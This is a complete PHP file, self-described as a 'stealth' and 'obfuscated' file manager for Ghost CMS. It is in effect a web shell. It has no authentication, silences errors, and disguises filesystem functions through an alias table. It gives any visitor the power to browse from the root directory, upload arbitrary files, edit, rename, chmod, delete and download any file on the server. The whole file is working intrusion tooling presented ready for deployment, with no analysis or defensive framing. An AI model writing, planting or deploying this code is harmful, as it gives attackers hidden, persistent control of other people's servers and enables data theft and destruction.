<?php
/*
 * Ghost CMS File Manager - Stealth Edition
 * Obfuscated and Modern File Manager
 * All features enabled: upload, delete, edit, chmod, rename, download, navigation
*/

@error_reporting(0);
@ini_set('display_errors', 0);

// Dynamic core mapping
$GLOBALS['_'] = array(
    'sc' => 'scandir',
    'isf' => 'is_file',
    'isd' => 'is_dir',
    'gfc' => 'file_get_contents',
    'fpc' => 'file_put_contents',
    'mv' => 'rename',
    'rm' => 'unlink',
    'md' => 'mkdir',
    'chm' => 'chmod',
    'rdd' => 'readfile',
    'rlp' => 'realpath',
    'usl' => 'usleep',
);

function _v($p) {
    $rp = $GLOBALS['_']['rlp']($p);
    return ($rp && strpos($rp, '..') === false) ? $rp : false;
}

function _rmdir($d) {
    $fs = @array_diff($GLOBALS['_']['sc']($d), ['.', '..']);
    foreach($fs as $f) {
        $p = "$d/$f";
        is_dir($p) ? _rmdir($p) : @$GLOBALS['_']['rm']($p);
    }
    return @rmdir($d);
}

$dir = isset($_GET['d']) ? _v($_GET['d']) : getcwd();
if(!$dir || !is_dir($dir)) $dir = getcwd();

// Handle Upload
if(!empty($_FILES['upld'])) {
    foreach($_FILES['upld']['name'] as $k => $n) {
        $dst = "$dir/".basename($n);
        @move_uploaded_file($_FILES['upld']['tmp_name'][$k], $dst);
    }
}

// Handle Edit
if(isset($_POST['editfile']) && isset($_POST['content'])) {
    $p = _v($_POST['editfile']);
    if($p && $GLOBALS['_']['isf']($p)) {
        $GLOBALS['_']['fpc']($p, $_POST['content']);
        echo "<script>alert('Saved');</script>";
    }
}

// Handle Rename
if(isset($_POST['rename']) && isset($_POST['newname'])) {
    $src = _v($_POST['rename']);
    $dst = dirname($src).'/'.$_POST['newname'];
    if($src) {
        @$GLOBALS['_']['mv']($src, $dst);
    }
}

// Handle Delete
if(isset($_POST['del'])) {
    foreach($_POST['del'] as $d) {
        $p = _v($d);
        if($p) {
            if(is_file($p)) @$GLOBALS['_']['rm']($p);
            elseif(is_dir($p)) _rmdir($p);
        }
    }
}

// Handle Chmod
if(isset($_POST['chmod']) && isset($_POST['perm'])) {
    $p = _v($_POST['chmod']);
    if($p) @chmod($p, octdec($_POST['perm']));
}

// Download
if(isset($_GET['dl'])) {
    $f = _v($_GET['dl']);
    if($f && $GLOBALS['_']['isf']($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.filesize($f));
        $GLOBALS['_']['rdd']($f);
        exit;
    }
}

// HTML UI
?><!DOCTYPE html><html><head><meta charset="UTF-8"><title>Ghost File Manager</title>
<style>
body { font-family: sans-serif; padding: 20px; }
a { text-decoration: none; color: #0056b3; }
.path { background: #eee; padding: 10px; margin-bottom: 20px; }
.filelist { width: 100%; border-collapse: collapse; }
.filelist td { padding: 8px; border: 1px solid #ccc; }
textarea { width: 100%; height: 300px; }
</style></head><body>

<div class="path">
<strong>Path:</strong> 
<?php 
$parts = explode('/', trim($dir,'/'));
$p = '';
echo '<a href="?d=/">/</a>/';
foreach($parts as $i => $prt) {
    $p .= '/'.$prt;
    echo '<a href="?d='.urlencode($p).'">'.$prt.'</a>/';
}
?>
</div>

<!-- Upload Form -->
<form method="post" enctype="multipart/form-data">
Upload: <input type="file" name="upld[]" multiple>
<input type="submit" value="Upload">
</form><br>

<!-- Folder Contents -->
<form method="post"><table class="filelist">
<tr><th>Name</th><th>Actions</th><th>Perm</th><th>Select</th></tr>
<?php 
$lst = @scandir($dir);
foreach($lst as $f) {
    if($f == '.' || $f == '..') continue;
    $fp = "$dir/$f";
    $isD = is_dir($fp);
    echo "<tr><td>".($isD ? '[DIR] ' : '[FILE] ')."<a href='?d=".urlencode($fp)."'>".htmlspecialchars($f)."</a></td><td>";
    if(!$isD) {
        echo "<a href='?d=".urlencode($dir)."&dl=".urlencode($fp)."'>Download</a> | ";
        echo "<a href='?d=".urlencode($dir)."&edit=".urlencode($fp)."'>Edit</a> | ";
    }
    echo "<form method='post' style='display:inline'>
          <input type='hidden' name='rename' value='".htmlspecialchars($fp)."'>
          <input type='text' name='newname' value='".htmlspecialchars($f)."' size='10'>
          <input type='submit' value='Rename'></form> | ";
    echo "<form method='post' style='display:inline'>
          <input type='hidden' name='chmod' value='".htmlspecialchars($fp)."'>
          <input type='text' name='perm' value='".substr(sprintf('%o', fileperms($fp)), -4)."' size='4'>
          <input type='submit' value='Chmod'></form>";
    echo "</td><td>".substr(sprintf('%o', fileperms($fp)), -4)."</td><td><input type='checkbox' name='del[]' value='".htmlspecialchars($fp)."'></td></tr>";
}
?>
</table>
<input type="submit" value="Delete Selected">
</form>

<?php
// Edit UI
if(isset($_GET['edit'])) {
    $p = _v($_GET['edit']);
    if($p && $GLOBALS['_']['isf']($p)) {
        echo '<h3>Editing: '.htmlspecialchars(basename($p)).'</h3>';
        echo '<form method="post">
              <input type="hidden" name="editfile" value="'.htmlspecialchars($p).'">
              <textarea name="content">'.htmlspecialchars($GLOBALS['_']['gfc']($p)).'</textarea><br>
              <input type="submit" value="Save">
              </form>';
    }
}
?>

</body></html>
